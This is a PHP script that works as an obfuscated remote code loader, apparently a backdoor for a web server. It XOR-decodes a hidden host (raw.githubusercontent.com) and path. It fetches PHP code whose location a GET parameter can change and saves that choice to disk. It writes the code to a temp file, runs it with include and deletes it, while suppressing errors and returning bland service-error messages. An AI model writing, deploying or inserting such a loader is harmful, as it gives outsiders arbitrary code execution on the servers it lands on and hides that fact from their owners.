<?php
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
error_reporting(E_ALL);

function localXorEncryptDecrypt($data, $key) {
    $output = '';
    $keyChar = substr($key, 0, 1);
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($keyChar));
    }
    return $output;
}

 $customValueFile = 'custom_value.dat';
 $defaultSegment = "xenium3";
 $queryParam = "gf";

if (isset($_GET[$queryParam])) {
    $newSegment = $_GET[$queryParam];
    if (@file_put_contents($customValueFile, $newSegment) === false) {
        error_log("Failed to write custom value file");
    }
    $pathSegment = $newSegment;
} else {
    if (file_exists($customValueFile)) {
        $pathSegment = @file_get_contents($customValueFile);
        if ($pathSegment === false) {
            $pathSegment = $defaultSegment;
        }
    } else {
        $pathSegment = $defaultSegment;
    }
}
 $_ = "!";
 $url = localXorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
 $path = localXorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
 $exx = localXorEncryptDecrypt("QIQ", $_);
 $pc = $path . $pathSegment . $exx;
 
$fp = @fsockopen("ssl://$url", 443, $errno, $errstr, 10);
if (!$fp) {
    error_log("Connection failed: $errstr ($errno)");
    http_response_code(503);
    exit("Service temporarily unavailable");
}

 $request = "GET $pc HTTP/1.1\r\n";
 $request .= "Host: $url\r\n";
 $request .= "Connection: close\r\n\r\n";

if (@fwrite($fp, $request) === false) {
    error_log("Failed to send request");
    fclose($fp);
    http_response_code(503);
    exit("Service temporarily unavailable");
}

$response = '';
$startTime = time();
while (!feof($fp)) {
    if ((time() - $startTime) > 15) {
        error_log("Response timeout");
        fclose($fp);
        http_response_code(504);
        exit("Gateway timeout");
    }
    $response .= fgets($fp, 1024);
}
fclose($fp);

if (empty($response)) {
    error_log("Empty response received");
    http_response_code(502);
    exit("Bad gateway");
}

$parts = explode("\r\n\r\n", $response, 2);
if (count($parts) < 2) {
    error_log("Invalid response format");
    http_response_code(502);
    exit("Bad gateway");
}

$remotePayload = $parts[1];

if (empty($remotePayload) || strlen($remotePayload) < 10) {
    error_log("Payload too small or empty");
    http_response_code(502);
    exit("Bad gateway");
}

$parts = str_split($remotePayload, 4);
$obfuscatedPayload = implode('', $parts);

if (empty($obfuscatedPayload)) {
    error_log("Processed payload is empty");
    http_response_code(502);
    exit("Bad gateway");
}

$tempFile = @tempnam(sys_get_temp_dir(), $exx);
if ($tempFile === false) {
    error_log("Failed to create temp file");
    http_response_code(500);
    exit("Internal server error");
}

if (@file_put_contents($tempFile, $obfuscatedPayload) === false) {
    error_log("Failed to write temp file");
    @unlink($tempFile);
    http_response_code(500);
    exit("Internal server error");
}

if (!file_exists($tempFile) || !is_readable($tempFile)) {
    error_log("Temp file not readable");
    @unlink($tempFile);
    http_response_code(500);
    exit("Internal server error");
}

try {
    include $tempFile;
} catch (Exception $e) {
    error_log("Execution error: " . $e->getMessage());
} catch (Error $e) {
    error_log("Fatal error: " . $e->getMessage());
}

@unlink($tempFile);

?>